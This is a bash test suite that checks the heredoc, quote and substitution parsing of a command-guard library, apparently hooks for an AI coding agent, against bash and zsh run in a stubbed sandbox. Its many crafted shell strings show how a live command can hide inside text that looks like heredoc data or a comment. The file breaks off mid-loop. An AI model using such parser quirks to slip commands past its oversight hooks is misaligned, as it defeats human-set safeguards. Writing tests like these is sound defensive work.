#!/usr/bin/env bash
# lib.sh's lexers against bash as the oracle. hd_scan finds where a heredoc
# starts and, for separate_groups and neutralize_quoted_separators, which ( ) ;
# & | are code: whenever bash runs a case's marker, every stripper keeps its line,
# neutralize keeps the separator before it, and separate_groups opens its group.
# A << in quotes, or a quote in a comment, a heredoc body or "$( )", once made
# guards drop or merge the commands after it.
PASS=0; FAIL=0
pass(){ echo "  OK: $1"; PASS=$((PASS+1)); }
fail(){ echo "  FAIL: $1  $2"; FAIL=$((FAIL+1)); }
cd "$(dirname "${BASH_SOURCE[0]}")/.." || exit 1
# shellcheck source=../hooks/lib.sh
source hooks/lib.sh
TMP=$(mktemp -d "${TMPDIR:-/tmp}/cch.XXXXXX"); trap 'rm -rf "$TMP"' EXIT
mkdir -p "$TMP/run" "$TMP/home/.claude" "$TMP/stub"
M='echo HDMARK'

# The oracle runs each case for real, so nothing it names may reach a repo, a
# cluster or GitHub: an empty environment, a throwaway HOME, and stubs first on PATH.
for b in git gh python3 kubectl curl sudo; do printf '#!/bin/sh\nexit 0\n' > "$TMP/stub/$b"; chmod +x "$TMP/stub/$b"; done
# Each run reads /dev/null and its process group is killed after it, or after
# ORACLE_LIMIT seconds: a case a shell hangs on is a failed row, not a stuck suite.
ORACLE_LIMIT=10
oracle() {   # SHELL CMD: 0 if SHELL printed the marker line
  local out="$TMP/oracle.out"; rm -f "$out" "$out.late"
  ( set -m
    (cd "$TMP/run" && exec env -i HOME="$TMP/home" PATH="$TMP/stub:/usr/bin:/bin" "$1" -c "$2" </dev/null >"$out" 2>/dev/null) & p=$!
    (sleep "$ORACLE_LIMIT"; kill -9 -- -"$p" && : > "$out.late") & w=$!
    wait "$p"; kill -- -"$w"; wait "$w"; kill -9 -- -"$p" ) 2>/dev/null
  [ -e "$out.late" ] && { fail "$1 did not end within ${ORACLE_LIMIT}s" "[${2//$'\n'/\\n}]"; return 1; }
  grep -qx HDMARK "$out"
}
runs_in_bash() { oracle /bin/bash "$1"; }
keeps() { printf '%s\n' "$1" | grep -qxF "$M"; }

# Each case: a label, then the command. The marker line is always a line of its own.
CASES=(
  "here-string"                 $'cat <<<x\n'"$M"$'\nx'
  "here-string, quoted word"    $'cat <<< "a b"\n'"$M"$'\nb'
  "<< in double quotes"         $'echo "<<x"\n'"$M"$'\nx'
  "<< in single quotes"         $'echo \'<<x\'\n'"$M"$'\nx'
  "<< in \$'...' after \\'"     $'echo $\'it\\\'s <<x\'\n'"$M"$'\nx'
  "<< after a comment"          $'true # <<x\n'"$M"$'\nx'
  "<< on a comment line"        $'# <<x\n'"$M"$'\nx'
  "a quoted } inside \${ }, then a real opener" $'echo ${x:-"}"} <<y > n.md\na " <<z\ny\n'"$M"$'\nz'
  "<< in \$(( ))"               $'echo $((1<<x))\n'"$M"$'\nx'
  "<< in (( ))"                 $'((y = 1 << x))\n'"$M"$'\nx'
  "<< in \$[ ]"                 $'y=$[1<<x]\n'"$M"$'\nx'
  "escaped \\<<"                $'echo \\<<x\n'"$M"$'\nx'
  "<< inside a string spanning lines" $'echo "a\n<<x"\n'"$M"$'\nx'
  "a body's apostrophe, then a quoted <<" $'cat <<EOF >/dev/null\nit\'s\nEOF\ngit commit -F - \'<<x\'\n'"$M"$'\nx'
  "delimiter with a dot"        $'cat <<EOF.x > notes.md\ndata\nEOF.x\n'"$M"
  "delimiter partly quoted"     $'cat <<E"O"F > notes.md\ndata\nEOF\n'"$M"
  "quoted delimiter run on"     $'cat <<\'EOF\'x > notes.md\ndata\nEOFx\n'"$M"
  "terminator indented, no dash" $'cat <<EOF > notes.md\ndata\n  EOF\nEOF\n'"$M"
  "an indented look-alike terminator, then an opener" $'cat <<EOF > notes.md\n  EOF\ncat <<y > notes.md\nEOF\n'"$M"$'\ny'
  "a quote the opener line leaves open" $'cat <<x "\n" ; \\\n'"$M"$'\nx'
  "a body fed to a shell"       $'bash <<EOF\n'"$M"$'\nEOF'
  "after a real body"           $'cat <<\'EOF\' > notes.md\nnotes\nEOF\n'"$M"
  "two openers on one line"     $'cat <<A <<B > notes.md\na\nA\ncat <<Z > notes.md\nB\n'"$M"$'\nZ'
  "<< inside \${ }"              $'echo ${x:- <<y }\n'"$M"$'\ny'
  "<< inside \${ } in quotes"    $'echo "${x:-" <<y "}"\n'"$M"$'\ny'
  "an escaped \$ before '"       $'echo \\$\'a\\\' <<x > n.md\ncat \'\ncat <<z > n.md\nx\n'"$M"$'\nz'
  "# after an escaped blank"    $'echo a\\ #<<x > n.md\ncat <<z > n.md\nx\n'"$M"$'\nz'
  "# after a line continuation" $'echo a\\\n#<<x > n.md\ncat <<z > n.md\nx\n'"$M"$'\nz'
  "an opener line that continues" $'cat <<x \\\n&& \\\n'"$M"$'\nx'
  "a body piped to a shell"     $'cat <<EOF | bash\n'"$M"$'\nEOF'
  "a body to a shell by path"   $'/bin/bash <<EOF\n'"$M"$'\nEOF'
  "a body to a shell via env"   $'env bash <<EOF\n'"$M"$'\nEOF'
  "(( that closes as ) ), two subshells" $'((cat <<EOF) )\nit\'s\nEOF\necho \'<<x \\\'\n'"$M"$'\nx'
  "\$\$ before ', a plain quote" $'echo $$\'a\\\' <<x > n.md\ncat \'\ncat <<z > n.md\nx\n'"$M"$'\nz'
  "a body run by eval"          $'eval "$(cat <<\'EOF\'\n'"$M"$'\nEOF\n)"'
  "a body sourced from stdin"   $'source /dev/stdin <<\'EOF\'\n'"$M"$'\nEOF'
  "EOF) ends a body in \$( ) (bash 3.2)" $'x=$(cat <<EOF\nhi\nEOF)\n'"$M"$'\nEOF'
  "a comment's apostrophe, then a body" $'true # it\'s\ncat <<\'EOF\' > n.md\nx\nEOF\n'"$M"
)

echo "=== bash runs the marker: every stripper keeps it ==="
n=0; RUNS=()   # the cases bash runs, for demand.py below
for ((i = 0; i < ${#CASES[@]}; i += 2)); do
  label=${CASES[$i]}; cmd=${CASES[$((i + 1))]}
  if ! runs_in_bash "$cmd"; then fail "$label" "(bash did not run the marker: the case is wrong)"; continue; fi
  n=$((n + 1)); RUNS+=("$i")
  for fn in strip_message_heredocs strip_inert_heredocs drop_data_heredocs; do
    out=$("$fn" "$cmd")
    keeps "$out" && pass "$label: $fn keeps it" || fail "$label: $fn dropped a line bash runs" "[$out]"
  done
done
[ "$n" -ge 25 ] && pass "$n cases run the marker in bash" || fail "cases run the marker in bash" "only $n"

echo ""
echo "=== bash 3.2 ends a \$( ) or <( ) at a ) its heredoc body did not open ==="
# zsh and bash 5 read most of these bodies whole, so a row is asserted only where
# /bin/bash runs the marker (macOS's 3.2): every stripper keeps it, as typed.
INSUB=(
  "a bare )"                     $'x=$(cat <<\'EOF\'\n)\n'"$M"$'\nEOF\n)'
  "fix(x): y )"                  $'x=$(cat <<\'EOF\'\nfix(x): y )\n'"$M"$'\nEOF\n)'
  "it's ) it's )"                $'x=$(cat <<\'EOF\'\nit\'s ) it\'s )\n'"$M"$'\nEOF\n)'
  "an escaped backslash, then )" $'x=$(cat <<\'EOF\'\n\\\\)\n'"$M"$'\nEOF\n)'
  "a# c )"                       $'x=$(cat <<\'EOF\'\na# c )\n'"$M"$'\nEOF\n)'
  "\"a \$(b) \" )"               $'x=$(cat <<\'EOF\'\n"a $(b) " )\n'"$M"$'\nEOF\n)'
  "a comment in \"\$( )\""       $'x="$(cat <<\'EOF\'\n# c )"\n'"$M"$'\nEOF\n)"'
  "a body in <( )"               $'cat <(cat <<EOF\nhi\n)\n'"$M"$'\nEOF'
  "x=\$(cat <<EOF) on one line"  $'x=$(cat <<EOF)\n'"$M"$'\nEOF'
  # The delimiter and the rest of the opener line go through the same scanner.
  "a ) in a quoted delimiter"    $'x=$(cat <<\'E)F\'\nhi\nE)F\n'"$M"$'\n)'
  "a comment with ) after it, in \"\$( )\"" $'echo "$(cat <<\'EOF\' # )"\n'"$M"$'\nEOF\n)"'
  "\${ } holding ) after it"     $'x=$(cat <<\'EOF\' ${y)}\n'"$M"$'\nEOF\n)'
  "a backtick opened after it"   $'x=$(cat <<\'EOF\' `\n`)\n'"$M"$'\n`\nEOF\n)'
  "\$\\ then ( on the next line" $'x=$\\\n(cat <<\'EOF\'\nhi\n)\n'"$M"$'\nEOF'
  # bash 3.2 counts the paren in ${x:-(}: the $( ) that looks closed is open.
  "\${x:-(} in a \$( ) before it" $'d=$(echo ${x:-(}); cat <<\'EOF\'\n)\n'"$M"$'\nEOF\n)'
)
n32=0
for ((i = 0; i < ${#INSUB[@]}; i += 2)); do
  label=${INSUB[$i]}; cmd=${INSUB[$((i + 1))]}
  runs_in_bash "$cmd" || continue
  n32=$((n32 + 1))
  for fn in strip_message_heredocs strip_inert_heredocs drop_data_heredocs; do
    out=$("$fn" "$cmd")
    keeps "$out" && pass "$label: $fn keeps it" || fail "$label: $fn dropped a line bash 3.2 runs" "[$out]"
  done
done
echo "  ($n32 of $((${#INSUB[@]} / 2)) run the marker in this /bin/bash)"
# Each rule of that scanner on its own: the body (marker inside) stays as typed.
ASIS=(
  "a ( still open at the terminator"   $'x="$(cat <<\'EOF\'\n(\n'"$M"$'\nEOF\n)"'
  "a later body holding the open quote" $'x=$(cat <<\'EOF\'\nit\'s\nEOF\n)\ncat <<EOF2 > a.txt\n\'\n'"$M"$'\nEOF2'
  "\$( in double quotes"               $'x=$(cat <<\'EOF\'\n"a $(b"\n'"$M"$'\nEOF\n)'
  "a \$' string"                       $'x=$(cat <<\'EOF\'\n$\'a\'\n'"$M"$'\nEOF\n)'
  "an escaped (, then )"               $'x=$(cat <<\'EOF\'\n\\(\n)\n'"$M"$'\nEOF\n)'
  "a second body after an open quote"  $'x=$(cat <<\'EOF\'\nit\'s\nEOF\n)\ny=$(cat <<EOF\n)\n'"$M"$'\nEOF\n)'
  "a ) in the quoted delimiter"        $'x=$(cat <<\'E)F\'\n'"$M"$'\nE)F\n)'
)
for ((i = 0; i < ${#ASIS[@]}; i += 2)); do
  label=${ASIS[$i]}; cmd=${ASIS[$((i + 1))]}
  for fn in strip_message_heredocs strip_inert_heredocs drop_data_heredocs; do
    out=$("$fn" "$cmd")
    keeps "$out" && pass "$label: $fn keeps the body" || fail "$label: $fn dropped the body" "[$out]"
  done
done

echo ""
echo "=== a substitution the opener line leaves open: the next line is code ==="
# Every shell reads on to the ) or backtick that ends it, so the body starts one
# line later. Where /bin/bash runs the marker (every row in 3.2, asserted there):
# each stripper keeps it, separate_groups opens it as a group, and neutralize
# calls it unreadable and keeps the ; before it. demand.py checks every row.
# strip_message_heredocs drops only a message body, so its row has git commit -F -
# for cat. A check main passes too is left out: strip_inert on a >( target, and
# separate_groups in "$( )". The >( rows write stderr to it: on Linux, cat given
# a >( as a file reads its own pipe and never ends.
GM='(echo HDMARK)'
B32=; [ "$(/bin/bash -c 'echo "${BASH_VERSINFO[0]}"')" = 3 ] && B32=1
OPENAT=(
  "a \$( opened after the opener"      $'cat > notes.md <<\'EOF\' $(echo\nx ) ; \\\n'"$M"$'\nEOF'
  "a \"\$( opened after the opener"    $'cat > notes.md <<\'EOF\' "$(echo\nx )" ; \\\n'"$M"$'\nEOF'
  "a <( opened after the opener"       $'cat > notes.md <<\'EOF\' <(echo\nx ) ; \\\n'"$M"$'\nEOF'
  "a >( opened after the opener"       $'cat > notes.md <<\'EOF\' 2> >(echo\nx ) ; \\\n'"$M"$'\nEOF'
  "a backtick opened after the opener" $'cat > notes.md <<\'EOF\' `echo\nx ` ; \\\n'"$M"$'\nEOF'
  "a group closed in a \$( ) opened after it" $'cat > notes.md <<\'EOF\' $( (echo)\nx ) ; \\\n'"$M"$'\nEOF'
  "\${x:-(} in a \$( ) after it (bash 3.2 counts the paren)" $'cat > notes.md <<\'EOF\' $(echo ${x:-(})\nx ) ; \\\n'"$M"$'\nEOF'
)
# The same in the "$( )" frame the opener sits in.
FRAME_OPEN=(
  "a \$( opened after an opener in \"\$( )\"" $'echo "$(cat <<\'EOF\' $(echo\nx ) ; \\\n'"$M"$'\nEOF\necho )"'
  "a <( opened after an opener in \"\$( )\"" $'echo "$(cat <<\'EOF\' <(echo\nx ) ; \\\n'"$M"$'\nEOF\necho )"'
  "a >( opened after an opener in \"\$( )\"" $'echo "$(cat <<\'EOF\' 2> >(echo\nx ) ; \\\n'"$M"$'\nEOF\necho )"'
)
as_message() {   # the command with a commit message for its body
  local c=$1 a='cat > notes.md' b='git commit -F -' f='$(cat <<' g='$(true; git commit -F - <<'
  c=${c/"$a"/$b}; printf '%s' "${c/"$f"/$g}"
}
nopen=0; OF=("${OPENAT[@]}" "${FRAME_OPEN[@]}")
for ((i = 0; i < ${#OF[@]}; i += 2)); do
  label=${OF[$i]}; cmd=${OF[$((i + 1))]}; mcmd=$(as_message "$cmd")
  if ! runs_in_bash "$cmd" || ! runs_in_bash "$mcmd"; then
    [ -n "$B32" ] && fail "$label" "(bash 3.2 did not run the marker: the case is wrong)"; continue
  fi
  nopen=$((nopen + 1))
  out=$(strip_message_heredocs "$mcmd")
  keeps "$out" && pass "$label: strip_message_heredocs keeps it" || fail "$label: strip_message_heredocs dropped a line bash runs" "[$out]"
  for fn in strip_inert_heredocs drop_data_heredocs; do
    [ "$fn" = strip_inert_heredocs ] && [[ "$cmd" == *'>('* ]] && continue
    out=$("$fn" "$cmd")
    keeps "$out" && pass "$label: $fn keeps it" || fail "$label: $fn dropped a line bash runs" "[$out]"
  done
  if [ "$i" -lt "${#OPENAT[@]}" ]; then
    out=$(separate_groups "${cmd//"$M"/$GM}")
    [[ "$out" == *";echo HDMARK;"* ]] && pass "$label: separate_groups opens the group" || fail "$label: separate_groups left a group bash runs" "[$out]"
  fi
  out=$(neutralize_quoted_separators "$cmd"); rc=$?
  [ "$rc" = 3 ] && printf '%s\n' "$out" | grep -qF ' ; \' && pass "$label: unreadable, and neutralize keeps the ;" \
    || fail "$label: neutralize" "rc=$rc [$out]"
done
if [ -n "$B32" ]; then
  [ "$nopen" = $((${#OF[@]} / 2)) ] && pass "bash 3.2 ran the marker in all $nopen opener rows" || fail "bash 3.2 ran the marker in $nopen opener rows" "of $((${#OF[@]} / 2))"
else echo "  ($nopen of $((${#OF[@]} / 2)) opener rows run the marker in this /bin/bash, which is not 3.2)"; fi
# zsh, where bash 3.2 does not, keeps a $( ) open past a case pattern ). strip_inert
# keeps any command holding case, so it is not asserted.
ZSH_OPENAT=(
  "case in a \$( ) opened after the opener (zsh)" $'cat > notes.md <<\'EOF\' $(case a in a) echo\nx ;; esac) ; \\\n'"$M"$'\nEOF'
)
runs_in_zsh() { oracle /bin/zsh "$1"; }
if [ -x /bin/zsh ]; then
  for ((i = 0; i < ${#ZSH_OPENAT[@]}; i += 2)); do
    label=${ZSH_OPENAT[$i]}; cmd=${ZSH_OPENAT[$((i + 1))]}; mcmd=$(as_message "$cmd")
    if ! runs_in_zsh "$cmd" || ! runs_in_zsh "$mcmd"; then fail "$label" "(zsh did not run the marker: the case is wrong)"; continue; fi
    out=$(strip_message_heredocs "$mcmd")
    keeps "$out" && pass "$label: strip_message_heredocs keeps it" || fail "$label: strip_message_heredocs dropped a line zsh runs" "[$out]"
    out=$(drop_data_heredocs "$cmd")
    keeps "$out" && pass "$label: drop_data_heredocs keeps it" || fail "$label: drop_data_heredocs dropped a line zsh runs" "[$out]"
    out=$(neutralize_quoted_separators "$cmd"); rc=$?
    [ "$rc" = 3 ] && printf '%s\n' "$out" | grep -qF ' ; \' && pass "$label: unreadable, and neutralize keeps the ;" \
      || fail "$label: neutralize" "rc=$rc [$out]"
  done
else echo "  SKIP: no /bin/zsh for the zsh rows"; fi
# Inside a substitution opened after the opener, each thing whose reading is
# not sure, on its own: the body (marker inside) stays as typed. Only the
# \${x:-(} row (bash 3.2) and case (zsh) have a shell that runs a marker.
AFTER=(
  "a backslash in it"                  $'cat > notes.md <<\'EOF\' $(echo \\( )\n'"$M"$'\nEOF'
  "\${ } holding a paren in it"         $'cat > notes.md <<\'EOF\' $(echo ${x:-(})\n'"$M"$'\nEOF'
  "a \$' string in it"                 $'cat > notes.md <<\'EOF\' $(echo $\'a\' )\n'"$M"$'\nEOF'
  "a \$\$' string in it"               $'cat > notes.md <<\'EOF\' $(echo $$\'a\' )\n'"$M"$'\nEOF'
  "a comment in backticks"             $'cat > notes.md <<\'EOF\' `echo # a`\n'"$M"$'\nEOF'
  "case in it"                         $'cat > notes.md <<\'EOF\' $(case a in a) echo;; esac)\n'"$M"$'\nEOF'
  "(( in it"                           $'cat > notes.md <<\'EOF\' $( ((1)) ; echo )\n'"$M"$'\nEOF'
  "\$(( in double quotes in it"        $'cat > notes.md <<\'EOF\' $(echo "$((1))")\n'"$M"$'\nEOF'
  "a backtick in it"                   $'cat > notes.md <<\'EOF\' $(echo `echo a`)\n'"$M"$'\nEOF'
  "a backtick in double quotes in it"  $'cat > notes.md <<\'EOF\' $(echo "`echo a`")\n'"$M"$'\nEOF'
  "a paren in backticks"               $'cat > notes.md <<\'EOF\' `echo (a)`\n'"$M"$'\nEOF'
  "a paren in backticks in quotes"     $'cat > notes.md <<\'EOF\' "`echo (a)`"\n'"$M"$'\nEOF'
)
for ((i = 0; i < ${#AFTER[@]}; i += 2)); do
  label=${AFTER[$i]}; cmd=${AFTER[$((i + 1))]}
  out=$(strip_message_heredocs "$(as_message "$cmd")")
  keeps "$out" && pass "after the opener, $label: strip_message_heredocs keeps the body" || fail "after the opener, $label: strip_message_heredocs dropped the body" "[$out]"
  for fn in strip_inert_heredocs drop_data_heredocs; do
    [ "$fn" = strip_inert_heredocs ] && [[ "$cmd" == *case* ]] && continue
    out=$("$fn" "$cmd")
    keeps "$out" && pass "after the opener, $label: $fn keeps the body" || fail "after the opener, $label: $fn dropped the body" "[$out]"
  done
done
# Closed on the opener line, with none of those inside: the body is still data.
CLOSED_AFTER=($'cat > notes.md <<\'EOF\' $(echo) ; true\n'"$M"$'\nEOF' $'cat <<\'EOF\' > "$(pwd)/notes.md"\n'"$M"$'\nEOF')
for cmd in "${CLOSED_AFTER[@]}"; do
  runs_in_bash "$cmd" && { fail "a closed \$( ) after the opener" "(bash ran the marker: the case is wrong)"; continue; }
  out=$(strip_inert_heredocs "$cmd")
  keeps "$out" && fail "a closed \$( ) after the opener: strip_inert_heredocs keeps the body" "[$out]" \
    || pass "a closed \$( ) after the opener: strip_inert_heredocs still drops the body"
done

echo ""
echo "=== a comment or \${ } in \"\$( )\", or a comment right after ; in \$( ): bash 3.2 reads it as text ==="
# bash 3.2 does not skip a comment in "$( )": its apostrophe opens a quote that
# ends the "$( )" a line later. Read as a comment, the quote stayed open and hid
# the ; after it. A paren in ${ } does the same. In an unquoted $( ), bash 3.2
# skips a comment after a blank, a newline or the $( itself, and reads one right
# after ; & | ( or ) as text. Such a command is unreadable: each guard asks, and
# neutralize prints the old reading, which keeps the ;.
ITEMD=(
  "a comment's apostrophe in \"\$( )\"" $'echo "$(echo hi # it\'s\n\')"\ntrue ; echo HDMARK'
  "\${y)} in \"\$( )\""                 $'echo "$(echo ${y)}" ; echo HDMARK ; echo "\n)"'
  "a comment's apostrophe right after ; in \$( )" $'echo $(true;# it\'s\n\') ; echo HDMARK ; echo \'\n\''
  "a comment's apostrophe right after ) in \$( )" $'echo $( (true)# it\'s\n\') ; echo HDMARK ; echo \'\n\''
)
nd=0
for ((i = 0; i < ${#ITEMD[@]}; i += 2)); do
  label=${ITEMD[$i]}; cmd=${ITEMD[$((i + 1))]}
  if ! runs_in_bash "$cmd"; then [ -n "$B32" ] && fail "$label" "(bash 3.2 did not run the marker: the case is wrong)"; continue; fi
  nd=$((nd + 1))
  out=$(neutralize_quoted_separators "$cmd"); rc=$?
  [[ "$out" == *"; echo HDMARK"* ]] && [ "$rc" = 3 ] && pass "$label: unreadable, and neutralize keeps the ;" \
    || fail "$label: neutralize" "rc=$rc [$out]"
done
if [ -n "$B32" ]; then
  [ "$nd" = $((${#ITEMD[@]} / 2)) ] && pass "bash 3.2 ran the marker in all $nd comment rows" || fail "bash 3.2 ran the marker in $nd comment rows" "of $((${#ITEMD[@]} / 2))"
fi
# Each rule on its own, on any bash: unreadable where it holds a paren, quote,
# backtick or backslash; readable where it holds none, or where bash 3.2 also
# reads a comment.
unread() { printf '%s\n' "$1" | awk "$HEREDOC_AWK"'{ line[NR] = $0 } END { sh_classify(NR); exit SH_BAD ? 0 : 1 }'; }
UNREAD_D=('echo "$(echo ${x:-(})"' 'echo "$(echo ${y)})"')
for c in "(" ")" "'" '"' '`' '\'; do UNREAD_D+=("echo \"\$(echo hi # a${c}b"$'\n'")\""); done
UNREAD_D+=($'echo $(true;# it\'s\n)' $'echo $(true&&# a (b\n)' $'echo $(true|# a "b\n)' $'echo $( (true)# a `b\n)' $'echo $( (# a \\b\n) )' $'cat <(true;# it\'s\n)')
READ_D=($'echo "$(echo hi # a b\n)"' 'echo "$(echo ${x:-$y})"' $'x=$(echo hi # it\'s\n)' 'echo "`echo hi # it'"'"'s`"' 'echo ${x:-(}')
READ_D+=($'echo $(# it\'s\n)' $'cat <(# it\'s\n)' $'echo $(true\t# it\'s\n)' $'echo $(true\n# it\'s\n)' $'echo $(true;# a b\n)' $'true;# it\'s')
for cmd in "${UNREAD_D[@]}" $'cat > n.md <<EOF\n$(echo hi # it\'s\n)\nEOF'; do
  unread "$cmd" && pass "unreadable: [${cmd//$'\n'/\\n}]" || fail "read: [${cmd//$'\n'/\\n}]" ""
done
for cmd in "${READ_D[@]}"; do
  unread "$cmd" && fail "unreadable: [${cmd//$'\n'/\\n}]" "" || pass "readable: [${cmd//$'\n'/\\n}]"
done

echo ""
echo "=== a heredoc after a substitution that closed: its body is read as without it ==="
# An opener is inside a substitution only when one is open at its << or the
# reading is in doubt (lib.sh's hd_in, HD_DOUBT). After one that closed, bash
# reads the body as data: no hazard line below runs the marker, the row runs to
# its end, and every stripper keeps or drops the body as without the prefix.
CLOSED=(
  "a closed \$( )"             'd=$(pwd); '
  "a \$( ) closed on a later line" $'d=$(\npwd\n)\n'
  "closed backticks"           'd=`pwd`; '
  "a closed <( )"              'cat <(echo a) >/dev/null; '
  "a closed \"\$( )\""         'd="$(pwd)"; '
  "\"\$( )\" in a closed \$( )" 'd=$(cd "$(dirname "$0")" && pwd); '
  "\$( in single quotes"       "echo '\$(' >/dev/null; "
  "backticks in single quotes" $'echo \'a `pwd` b\' >/dev/null; '
  "a backtick in single quotes" $'echo \'`\' >/dev/null; '
  "an escaped \$( in double quotes" 'echo "\$(" >/dev/null; '
  "an escaped \$( in double quotes over two lines" $'echo "a \\$(\nb" >/dev/null; '
  "\$( in a comment"           $'true # $(\n'
  "two closed \$( )"           'a=$(echo a); b=$(echo b); '
  "an earlier unquoted body, a backslash in its \$( )" $'cat >/dev/null <<E1\n$(echo \\( )\nE1\n'
  "an earlier body fed to a shell, a \$( ) left open in it" $'bash >/dev/null 2>&1 <<\'E1\'\necho $(echo\nE1\n'
  "an earlier body fed to a shell, a closed \$( ) in it" $'bash >/dev/null 2>&1 <<\'E1\'\nd=$(echo a); echo "$(pwd)"\nE1\n'
)
HAZARD=(   # body | the line after the terminator; each runs to its end after a closed prefix
  ") ; $M|"   ")\" ; $M ; echo \"|"   "') ; $M ; echo '|"
  "x )) ; $M|"   "it's|echo ' ; $M ; echo '"   "say \"|echo \" ; $M ; echo \""   $'# it\'s (\n) ; '"$M|"   $'EOF)\n'"$M|"
)
CLOSED_ROWS=()
for ((i = 0; i < ${#CLOSED[@]}; i += 2)); do
  p=${CLOSED[$((i + 1))]}
  for h in "${HAZARD[@]}"; do
    body=${h%%|*}; tail=${h#*|}
    c=$'cat >/dev/null <<\'EOF\'\n'"$body"$'\nEOF\n'"${tail:+$tail$'\n'}echo HDLIVE"
    CLOSED_ROWS+=("${CLOSED[$i]}" "$p" "$c")
  done
done
for ((i = 0; i < ${#CLOSED_ROWS[@]}; i += 3)); do
  label=${CLOSED_ROWS[$i]}; p=${CLOSED_ROWS[$((i + 1))]}; c=${CLOSED_ROWS[$((i + 2))]}
  oracle /bin/bash "$p$c"; out=$(cat "$TMP/oracle.out" 2>/dev/null)
  if printf '%s\n' "$out" | grep -qx HDMARK || ! printf '%s\n' "$out" | grep -qx HDLIVE; then
    fail "$label: [${c%%$'\n'EOF*}]" "(bash ran the marker or stopped early: the case is wrong)"; continue
  fi
  same=1; b1=${c#*$'\n'}; b1=${b1%%$'\n'*}
  for fn in strip_message_heredocs strip_inert_heredocs drop_data_heredocs; do
    printf '%s\n' "$("$fn" "$p$c")" | grep -qxF -- "$b1"; a=$?
    printf '%s\n' "$("$fn" "$c")" | grep -qxF -- "$b1"
    [ "$a" = $? ] || { same=0; fail "$label, body [${c%%$'\n'EOF*}]: $fn reads it unlike without the prefix" "[$("$fn" "$p$c")]"; }
  done
  unread "$p$c"; a=$?; unread "$c"
  [ "$a" = $? ] || { same=0; fail "$label, body [${c%%$'\n'EOF*}]: sh_classify reads it unlike without the prefix" ""; }
  [ "$same" = 1 ] && pass "$label, body [${c%%$'\n'EOF*}]: read as without the prefix"
done
# Each doubt on its own: the opener after it is read as inside a substitution,
# so a bare ) in the body keeps the command as typed. Only the \${x:-(} and $\
# rows have a shell that runs a marker (the INSUB table); the rest are caution.
DOUBT=(
  "a backslash in \$( )"          'd=$(echo \( ); '
  "a comment in \$( )"            $'d=$(echo # c\n); '
  "a \$' string in \$( )"         "d=\$(echo \$'a' ); "
  "case in \$( )"                 'd=$(case a in a) echo;; esac); '
  "(( in \$( )"                   'd=$( ((x = 1)) ; echo ); '
  "a backtick in \$( )"           'd=$(echo `echo a`); '
  "a paren in backticks"          'd=`echo (a)`; '
  "\${ } holding a paren"         'd=$(echo ${x:-(}); '
  "\${ } holding \$"              'd=${x:-$HOME}; '
  "\$(( ))"                       'n=$((1 + 2)); '
  "\$(( )) in double quotes"      'n="$((1 + 2))"; '
  "a backtick in double quotes"   'd="`pwd`"; '
  "\$[ ] in \$( )"                'd=$(echo $[1]); '
  "\$\\ then ( on the next line"  $'d=$\\\n(pwd); '
  "an opener in a substitution before" $'x=$(cat <<\'E1\'\nhi\nE1\n)\n'
  "an even run of \$ before ' in \$( )" "d=\$(echo \$\$'a' ); "
)
for ((i = 0; i < ${#DOUBT[@]}; i += 2)); do
  label=${DOUBT[$i]}; cmd=${DOUBT[$((i + 1))]}$'cat > notes.md <<\'EOF\'\n)\n'"$M"$'\nEOF'
  for fn in strip_message_heredocs strip_inert_heredocs drop_data_heredocs; do
    out=$("$fn" "$cmd")
    keeps "$out" && pass "after $label: $fn keeps the body" || fail "after $label: $fn dropped the body" "[$out]"
  done
done
# The doubt outlasts a heredoc read in between, in sh_classify as in the strippers.
cmd=$'d=${x:-$HOME}; cat >/dev/null <<E1\na\nE1\ncat > notes.md <<\'EOF\'\n)\n'"$M"$'\nEOF'
unread "$cmd" && pass "a doubt, then a heredoc, then an opener: still inside a substitution" \
  || fail "a doubt, then a heredoc, then an opener" "sh_classify read the second body as data"
# #208 left this unreadable: a closed $( ), then a script body with an apostrophe.
cmd=$'d=$(pwd); cat > x.sh <<\'EOF\'\n# it\'s\necho hi\nEOF'
printf '%s\n' "$cmd" | awk "$HEREDOC_AWK"'{ line[NR] = $0 } END { sh_classify(NR); exit SH_BAD }' \
  && pass "a closed \$( ), then a body with an apostrophe: readable" || fail "a closed \$( ), then a body with an apostrophe" "unreadable"

echo ""
echo "=== a # right after a substitution's ), and \$\$' in a substitution (review of #234) ==="
# After the ) that ends a $( ), <( ), >( ) or $(( )), a # is part of the word, so
# a quote after it opens: bash runs the line after that string. After a subshell
# ) or an arithmetic command, # starts a comment (the controls). main reads the
# rows as unreadable, so these guard this branch, not main.
WORD=(
  "\$(pwd)#\""    'echo $(pwd)#"'
  "d=\$(pwd)#\""  'd=$(pwd)#"'
  "<(echo a)#\""  'cat <(echo a)#"'
  ">(true)#\""    'echo >(true)#"'
  "\$((1))#\""    'echo $((1))#"'
)
WORD_CONTROL=('(true)#"' '((1))#"' '(true) #"')
word_row() { printf '%s' "$1"$'\ncat > notes.md <<\'EOF\'\na ) b\n"\n'"$M"$'\necho "\nEOF\necho "'; }
# bash 3.2 reads any run of $ before a quote in a substitution as $': the \' does
# not end it, and the $( ) stays open past the opener. bash 5 reads $$ as the pid.
DOLLAR=(
  "\$\$' in \$( )"        $'d=$(echo $$\'a\\\' ); cat > notes.md <<"EOF"\na ) b\n\' )\n'"$M"$'\nEOF'
  "\$\$' in \"\$( )\""    $'d="$(echo $$\'a\\\' )"; cat > notes.md <<"EOF"\na ) b\n\' )"\n'"$M"$'\nEOF'
  "\$\$' in <( )"         $'cat <(echo $$\'a\\\' ) >/dev/null; cat > notes.md <<"EOF"\na ) b\n\' )\n'"$M"$'\nEOF'
  "\$\$\$\$' in \$( )"    $'d=$(echo $$$$\'a\\\' ); cat > notes.md <<"EOF"\na ) b\n\' )\n'"$M"$'\nEOF'
  "\$\$' in \$( ), the opener on the next line" $'d=$(echo $$\'a\\\' )\ncat > notes.md <<"EOF"\na ) b\n\' )\n'"$M"$'\nEOF'
)
DOLLAR_CONTROL=($'echo $$\'a\' >/dev/null; cat > notes.md <<"EOF"\na ) b\n\' )\n'"$M"$'\nEOF')
WORDR=(); for ((i = 0; i < ${#WORD[@]}; i += 2)); do WORDR+=("${WORD[$i]}" "$(word_row "${WORD[$((i + 1))]}")"); done
nw=0; nd2=0
for ((i = 0; i < ${#WORDR[@]}; i += 2)); do
  label=${WORDR[$i]}; cmd=${WORDR[$((i + 1))]}
  if ! runs_in_bash "$cmd"; then fail "$label" "(bash did not run the marker: the case is wrong)"; continue; fi
  nw=$((nw + 1))
  out=$(strip_message_heredocs "$(as_message "$cmd")")
  keeps "$out" && pass "$label: strip_message_heredocs keeps it" || fail "$label: strip_message_heredocs dropped a line bash runs" "[$out]"
